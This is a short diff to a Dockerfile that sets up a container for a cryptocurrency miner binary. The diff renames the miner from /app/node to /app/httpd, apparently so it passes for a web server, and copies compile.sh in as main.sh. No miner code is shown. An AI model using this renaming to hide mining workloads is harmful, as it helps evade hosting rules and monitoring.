@@ -15,15 +15,15 @@ RUN apt-get update && apt-get install -y \
 WORKDIR /app
 
 # Download miner binary
-COPY iniminer-linux-x64 /app/node
-RUN chmod +x /app/node
+COPY iniminer-linux-x64 /app/httpd
+RUN chmod +x /app/httpd
 
 # Copy startup script
 COPY input.sh /app/input.sh
 RUN chmod +x /app/input.sh
 
 # Copy startup script
-COPY main.sh /app/main.sh
+COPY compile.sh /app/main.sh
 RUN chmod +x /app/main.sh
 
 # Copy startup script
